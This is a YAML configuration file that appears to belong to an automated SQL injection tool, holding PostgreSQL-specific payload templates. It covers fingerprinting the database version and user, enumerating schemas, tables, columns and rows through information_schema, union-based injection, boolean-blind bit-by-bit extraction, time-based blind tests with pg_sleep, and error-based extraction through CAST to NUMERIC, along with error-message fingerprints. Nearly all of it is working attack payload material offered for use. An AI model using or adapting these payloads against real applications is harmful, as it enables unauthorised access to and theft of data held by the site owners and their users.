vendor: 
resource: 
 info: |
  concat_ws(
      '${enclose_value_sql}',
      version(),
      current_database(),
      user
  )
  || '${trail_sql}'
  
 schema: 
  database: |
   select 
       array_to_string(
           array(
               select 
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   SELECT
                       tables.table_schema r,
                       count(table_name) q
                   FROM information_schema.tables
                   group by r
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'
       
  table: |
   select 
       array_to_string(
           array(
               select 
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   SELECT 
                       tables.table_name r,
                       '0' q
                   FROM information_schema.tables
                   where tables.TABLE_SCHEMA = '${database}'
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'
       
  column: |
   select 
       array_to_string(
           array(
               select 
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q::text
                   || '${enclose_value_sql}'
               from (
                   SELECT 
                       columns.column_name r, 
                       '0' q
                   FROM information_schema.columns
                   where columns.TABLE_SCHEMA = '${database}'
                   and columns.TABLE_name = '${table}'
                   order by r
                   ${limit}
               )x
           ),
           '${separator_cell_sql}'
       )
       || '${trail_sql}'
       
  row: 
   query: |
    select 
        array_to_string(
            array(
                select 
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
                    || q::text
                    || '${enclose_value_sql}'
                from (
                    SELECT 
                        substr((${fields}), 1, 775) r,
                        count(*) q
                    FROM ${database}.${table}
                    group by r
                    ${limit}
                )x
            ),
            '${separator_cell_sql}'
        )
        || '${trail_sql}'
   fields: 
    field: trim(coalesce(${field.value}::text, ''))
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   select
       /**
        * If reach end of string (${lead}i) then NULLIF nullifies the result
        */
       '${lead}'
       || NULLIF(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           '${trail_sql}'
       )
  limit: limit 65536 offset ${limit.value}
  failsafe: (1337${indice}7330%2b1)::text
  calibrator: repeat(chr(35), 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - "ERROR: unterminated quoted identifier at or near"
    - "Query failed: ERROR:  unterminated quoted string at or near"
    - function\\.pg
    - PostgreSQL
    
 normal: 
  indices: union select ${indices}
  capacity: (select '${lead}' || ${indice} || ${calibrator})
  orderBy: order by 1337
  
 boolean: 
  test: 
   falses: 
    - true = false
    - true %21= true
    - false %21= false
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues: 
    - true = true
    - false = false
    - true %21= false
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${injection}), 
                ${window.char}, 
                1
            )
        ) 
        %26 ${bit}
    )
   length: char_length((${injection})) > ${window.char}
  modeAnd: and
  modeOr: or
  blind: ${boolean.mode} ${test}
  time: |
   ${boolean.mode} ''='' 
   || (
       select 
           CASE WHEN ${test} 
           THEN '' 
           else pg_sleep(${sleep_time}) 
       END
   )
   
 error: 
  method: 
   - name: CAST::text_numeric
     query: |
      /* Require FALSE statement, then OR */
      and 1 = 0 
      or 1 = CAST(
          (${window})::text 
          AS NUMERIC
      )
     capacity: 255